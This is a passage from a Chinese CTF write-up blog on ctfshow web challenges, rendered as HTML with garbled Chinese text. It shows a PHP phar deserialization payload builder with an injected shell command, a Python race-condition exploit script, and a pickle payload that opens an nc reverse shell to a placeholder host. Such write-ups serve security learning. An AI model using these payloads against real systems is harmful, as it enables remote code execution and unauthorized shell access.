<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ååºåˆ—åŒ–payloadæ„é€ </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="string">&#x27;;tac f*&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ä¾‹ä¸€ä¸ªpharå¯¹è±¡ä¾›åç»­æ“ä½œï¼Œåç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); </span><br><span class="line"><span class="comment">//å¼€å§‹ç¼“å†²å¯¹pharçš„å†™æ“ä½œ </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*è®¾ç½®è¯†åˆ«pharæ‹“å±•çš„æ ‡è¯†stubï¼Œå¿…é¡»ä»¥ __HALT_COMPILER(); ?&gt; ç»“å°¾*/</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°†ååºåˆ—åŒ–çš„å¯¹è±¡æ”¾å…¥è¯¥æ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°†è‡ªå®šä¹‰çš„å½’æ¡£å…ƒæ•°æ®meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//pharæœ¬è´¨ä¸Šæ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œæ‰€ä»¥è¦æ·»åŠ å‹ç¼©çš„æ–‡ä»¶å’Œæ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;evo1ution&quot;</span>); </span><br><span class="line"><span class="comment">//åœæ­¢ç¼“å†²å¯¹pharçš„å†™æ“ä½œ</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>exp.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://29f200dd-1d6b-47c1-be60-9bd59408e422.challenge.ctf.show/&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line">stop = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    r = requests.post(url=url+<span class="string">&#x27;?fn=phar.phar&#x27;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">global</span> stop</span><br><span class="line">    response = requests.post(url=url+<span class="string">&#x27;?fn=phar://phar.phar/&#x27;</span>, data=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        flag = re.findall(<span class="string">&#x27;ctfshow&#123;.*?&#125;&#x27;</span>, response.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        stop = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> stop <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">    a = threading.Thread(target=upload)</span><br><span class="line">    b = threading.Thread(target=read)</span><br><span class="line">    a.start()</span><br><span class="line">    b.start()</span><br></pre></td></tr></table></figure>



<h2 id="web277-278"><a href="#web277-278" class="headerlink" title="web277-278"></a>web277-278</h2><p>æŸ¥çœ‹æºç å‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span><br></pre></td></tr></table></figure>

<p>åå¼¹shellï¼ˆä¸¤é“é¢˜è²Œä¼¼éƒ½è¿‡æ»¤äº†<code>os.system</code>ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">getflag</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        a=<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;nc xxx.xxx.xxx.xxx xxxx -e /bin/sh&quot;).read()&#x27;</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">eval</span>,(a,))</span><br><span class="line">    	<span class="comment"># ä¹Ÿå¯ä»¥è¿™ä¹ˆå†™</span></span><br><span class="line">    	<span class="comment"># a=&#x27;nc xxx.xxx.xxx.xxx xxxx -e /bin/sh&#x27;</span></span><br><span class="line">        <span class="comment"># return(os.popen,(a,))</span></span><br><span class="line"></span><br><span class="line">f = getflag()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(f)))</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://www.evo1ution.cn/">Evo1ution</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://evolution957.github.io/2023/02/08/ctfshow-web2/">https://evolution957.github.io/2023/02/08/ctfshow-web2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://Evolution957.github.io" target="_blank">Evo1ution's blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/ctfshow/">ctfshow</a></div><div class="post_share"><div class="social-share" data-image="/img/ctfshow_web2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/06/01/ctfshow-web3/"><img class="prev-cover" src="/img/ctfshow_web3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 3</div></div></a></div><div class="next-post pull-right"><a href="/2023/02/05/hgame-2023-web-all/"><img class="next-cover" src="/img/hgame2023.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">hgame 2023 webé¢˜è§£</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/2023/01/28/ctfshow-nianctf-web/" title="ctfshow-å¹´ctf-webé¢˜è§£"><img class="cover" src="/img/nianctf.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-28</div><div class="title">ctfshow-å¹´ctf-webé¢˜è§£</div></div></a></div><div><a href="/2023/08/26/ctfshow-web4/" title="ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 4"><img class="cover" src="/img/ctfshow_web4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-26</div><div class="title">ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 4</div></div></a></div><div><a href="/2023/06/01/ctfshow-web3/" title="ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 3"><img class="cover" src="/img/ctfshow_web3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-01</div><div class="title">ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 3</div></div></a></div><div><a href="/2022/12/22/ctfshow-web1/" title="ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 1"><img class="cover" src="/img/ctfshow_web1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-22</div><div class="title">ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 1</div></div></a></div><div><a href="/2022/04/27/BugKu-Web3/" title="BugKu Web åˆ·é¢˜è®°å½•3"><img class="cover" src="/img/BugKu_Web3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-27</div><div class="title">BugKu Web åˆ·é¢˜è®°å½•3</div></div></a></div><div><a href="/2022/04/24/BugKu-Web1/" title="BugKu Web åˆ·é¢˜è®°å½•1"><img class="cover" src="https://img.gejiba.com/images/2da3987b7d33039c8ec0c5995314d1d5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-24</div><div class="title">BugKu Web åˆ·é¢˜è®°å½•1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-Web%E5%85%A5%E9%97%A8%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952"><span class="toc-number">1.</span> <span class="toc-text">ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.</span> <span class="toc-text">æ–‡ä»¶ä¸Šä¼ </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web151"><span class="toc-number">2.1.</span> <span class="toc-text">web151</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web152"><span class="toc-number">2.2.</span> <span class="toc-text">web152</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web153"><span class="toc-number">2.3.</span> <span class="toc-text">web153</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web154-155"><span class="toc-number">2.4.</span> <span class="toc-text">web154-155</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web156"><span class="toc-number">2.5.</span> <span class="toc-text">web156</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web157-159"><span class="toc-number">2.6.</span> <span class="toc-text">web157-159</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web160"><span class="toc-number">2.7.</span> <span class="toc-text">web160</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web161"><span class="toc-number">2.8.</span> <span class="toc-text">web161</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web162-163"><span class="toc-number">2.9.</span> <span class="toc-text">web162-163</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web164"><span class="toc-number">2.10.</span> <span class="toc-text">web164</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web165"><span class="toc-number">2.11.</span> <span class="toc-text">web165</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web166"><span class="toc-number">2.12.</span> <span class="toc-text">web166</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web167"><span class="toc-number">2.13.</span> <span class="toc-text">web167</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web168"><span class="toc-number">2.14.</span> <span class="toc-text">web168</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web169-170"><span class="toc-number">2.15.</span> <span class="toc-text">web169-170</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">sqlæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web171"><span class="toc-number">3.1.</span> <span class="toc-text">web171</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web172"><span class="toc-number">3.2.</span> <span class="toc-text">web172</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web173"><span class="toc-number">3.3.</span> <span class="toc-text">web173</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web174"><span class="toc-number">3.4.</span> <span class="toc-text">web174</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web175"><span class="toc-number">3.5.</span> <span class="toc-text">web175</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web176"><span class="toc-number">3.6.</span> <span class="toc-text">web176</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web177"><span class="toc-number">3.7.</span> <span class="toc-text">web177</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web178"><span class="toc-number">3.8.</span> <span class="toc-text">web178</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web179"><span class="toc-number">3.9.</span> <span class="toc-text">web179</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web180"><span class="toc-number">3.10.</span> <span class="toc-text">web180</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web181"><span class="toc-number">3.11.</span> <span class="toc-text">web181</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web182"><span class="toc-number">3.12.</span> <span class="toc-text">web182</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web183"><span class="toc-number">3.13.</span> <span class="toc-text">web183</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web184"><span class="toc-number">3.14.</span> <span class="toc-text">web184</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web185-186"><span class="toc-number">3.15.</span> <span class="toc-text">web185-186</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web187"><span class="toc-number">3.16.</span> <span class="toc-text">web187</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web188"><span class="toc-number">3.17.</span> <span class="toc-text">web188</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web189"><span class="toc-number">3.18.</span> <span class="toc-text">web189</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web190"><span class="toc-number">3.19.</span> <span class="toc-text">web190</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web191"><span class="toc-number">3.20.</span> <span class="toc-text">web191</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web192"><span class="toc-number">3.21.</span> <span class="toc-text">web192</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web193"><span class="toc-number">3.22.</span> <span class="toc-text">web193</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web194"><span class="toc-number">3.23.</span> <span class="toc-text">web194</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web195"><span class="toc-number">3.24.</span> <span class="toc-text">web195</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web196"><span class="toc-number">3.25.</span> <span class="toc-text">web196</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web197"><span class="toc-number">3.26.</span> <span class="toc-text">web197</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web198"><span class="toc-number">3.27.</span> <span class="toc-text">web198</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web199-200"><span class="toc-number">3.28.</span> <span class="toc-text">web199-200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web201"><span class="toc-number">3.29.</span> <span class="toc-text">web201</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web202"><span class="toc-number">3.30.</span> <span class="toc-text">web202</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web203"><span class="toc-number">3.31.</span> <span class="toc-text">web203</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web204"><span class="toc-number">3.32.</span> <span class="toc-text">web204</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web205"><span class="toc-number">3.33.</span> <span class="toc-text">web205</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web206"><span class="toc-number">3.34.</span> <span class="toc-text">web206</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web207"><span class="toc-number">3.35.</span> <span class="toc-text">web207</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web208"><span class="toc-number">3.36.</span> <span class="toc-text">web208</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web209"><span class="toc-number">3.37.</span> <span class="toc-text">web209</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web210"><span class="toc-number">3.38.</span> <span class="toc-text">web210</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web211"><span class="toc-number">3.39.</span> <span class="toc-text">web211</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web212"><span class="toc-number">3.40.</span> <span class="toc-text">web212</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web213"><span class="toc-number">3.41.</span> <span class="toc-text">web213</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web214"><span class="toc-number">3.42.</span> <span class="toc-text">web214</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web215"><span class="toc-number">3.43.</span> <span class="toc-text">web215</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web216"><span class="toc-number">3.44.</span> <span class="toc-text">web216</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web217"><span class="toc-number">3.45.</span> <span class="toc-text">web217</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web218"><span class="toc-number">3.46.</span> <span class="toc-text">web218</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web219"><span class="toc-number">3.47.</span> <span class="toc-text">web219</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web220"><span class="toc-number">3.48.</span> <span class="toc-text">web220</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web221"><span class="toc-number">3.49.</span> <span class="toc-text">web221</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web222"><span class="toc-number">3.50.</span> <span class="toc-text">web222</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web223"><span class="toc-number">3.51.</span> <span class="toc-text">web223</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web224"><span class="toc-number">3.52.</span> <span class="toc-text">web224</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web225"><span class="toc-number">3.53.</span> <span class="toc-text">web225</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-Handler"><span class="toc-number">3.53.1.</span> <span class="toc-text">æ–¹æ³•ä¸€ Handler</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-number">3.53.2.</span> <span class="toc-text">æ–¹æ³•äºŒ é¢„å¤„ç†</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web226"><span class="toc-number">3.54.</span> <span class="toc-text">web226</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web227"><span class="toc-number">3.55.</span> <span class="toc-text">web227</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web228-230"><span class="toc-number">3.56.</span> <span class="toc-text">web228-230</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web231"><span class="toc-number">3.57.</span> <span class="toc-text">web231</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web232"><span class="toc-number">3.58.</span> <span class="toc-text">web232</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web233"><span class="toc-number">3.59.</span> <span class="toc-text">web233</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web234"><span class="toc-number">3.60.</span> <span class="toc-text">web234</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web235"><span class="toc-number">3.61.</span> <span class="toc-text">web235</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web236"><span class="toc-number">3.62.</span> <span class="toc-text">web236</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web237"><span class="toc-number">3.63.</span> <span class="toc-text">web237</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web238"><span class="toc-number">3.64.</span> <span class="toc-text">web238</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web239"><span class="toc-number">3.65.</span> <span class="toc-text">web239</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web240"><span class="toc-number">3.66.</span> <span class="toc-text">web240</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web241"><span class="toc-number">3.67.</span> <span class="toc-text">web241</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web242"><span class="toc-number">3.68.</span> <span class="toc-text">web242</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web243"><span class="toc-number">3.69.</span> <span class="toc-text">web243</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web244"><span class="toc-number">3.70.</span> <span class="toc-text">web244</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web245"><span class="toc-number">3.71.</span> <span class="toc-text">web245</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web246"><span class="toc-number">3.72.</span> <span class="toc-text">web246</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web247"><span class="toc-number">3.73.</span> <span class="toc-text">web247</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web248"><span class="toc-number">3.74.</span> <span class="toc-text">*web248</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web249"><span class="toc-number">3.75.</span> <span class="toc-text">web249</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web250"><span class="toc-number">3.76.</span> <span class="toc-text">web250</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web251"><span class="toc-number">3.77.</span> <span class="toc-text">web251</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web252"><span class="toc-number">3.78.</span> <span class="toc-text">web252</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web253"><span class="toc-number">3.79.</span> <span class="toc-text">web253</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.</span> <span class="toc-text">ååºåˆ—åŒ–</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web254"><span class="toc-number">4.1.</span> <span class="toc-text">web254</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web255"><span class="toc-number">4.2.</span> <span class="toc-text">web255</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web256"><span class="toc-number">4.3.</span> <span class="toc-text">web256</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web257"><span class="toc-number">4.4.</span> <span class="toc-text">web257</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web258"><span class="toc-number">4.5.</span> <span class="toc-text">web258</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web259"><span class="toc-number">4.6.</span> <span class="toc-text">web259</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web260"><span class="toc-number">4.7.</span> <span class="toc-text">web260</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web261"><span class="toc-number">4.8.</span> <span class="toc-text">web261</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web262"><span class="toc-number">4.9.</span> <span class="toc-text">web262</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web263"><span class="toc-number">4.10.</span> <span class="toc-text">web263</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web264"><span class="toc-number">4.11.</span> <span class="toc-text">web264</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web265"><span class="toc-number">4.12.</span> <span class="toc-text">web265</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web266"><span class="toc-number">4.13.</span> <span class="toc-text">web266</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E6%9C%AB%E5%B0%BE"><span class="toc-number">4.13.1.</span> <span class="toc-text">åˆ é™¤æœ«å°¾}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7%E4%B8%AA%E6%95%B0"><span class="toc-number">4.13.2.</span> <span class="toc-text">ä¿®æ”¹å±æ€§ä¸ªæ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B9%E5%8F%98%E7%B1%BB%E5%90%8D"><span class="toc-number">4.13.3.</span> <span class="toc-text">æ”¹å˜ç±»å</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web267"><span class="toc-number">4.14.</span> <span class="toc-text">web267</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web268"><span class="toc-number">4.15.</span> <span class="toc-text">web268</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web269"><span class="toc-number">4.16.</span> <span class="toc-text">web269</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web270"><span class="toc-number">4.17.</span> <span class="toc-text">web270</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web271"><span class="toc-number">4.18.</span> <span class="toc-text">web271</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web272-273"><span class="toc-number">4.19.</span> <span class="toc-text">web272-273</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web274"><span class="toc-number">4.20.</span> <span class="toc-text">web274</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web275"><span class="toc-number">4.21.</span> <span class="toc-text">web275</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web276"><span class="toc-number">4.22.</span> <span class="toc-text">web276</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web277-278"><span class="toc-number">4.23.</span> <span class="toc-text">web277-278</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By Evo1ution</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">å²‚èƒ½å°½å¦‚äººæ„ï¼Œä½†æ±‚æ— æ„§æˆ‘å¿ƒ</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas 